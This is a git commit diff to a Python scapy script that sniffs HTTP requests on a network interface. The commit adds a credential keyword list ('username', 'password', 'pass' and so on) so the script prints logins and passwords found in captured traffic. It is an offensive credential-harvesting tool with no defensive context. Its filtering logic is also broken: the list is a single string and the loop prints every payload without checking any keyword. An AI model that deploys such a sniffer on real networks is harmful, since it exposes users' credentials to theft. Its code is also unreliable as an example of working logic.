889eba16a7943e8dc4b14f55b797a235360568b3
Viktor <swifrorlilko@gmail.com>
2020-02-03 01:13:05 +0200

    adding keywords and printing http pass usr

--- sniffer/sniffer.py
+++ sniffer/sniffer.py
@@ -8,7 +8,9 @@ def sniff(interface):
 def processPacket(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw]
-            print(load)
-
+            load = packet[scapy.Raw].load
+            keywords = ["username, user, usr, login, password, pass, pswd"]
+            for keyword in keywords:
+                print(load)
+                break
 sniff("enp3s0")
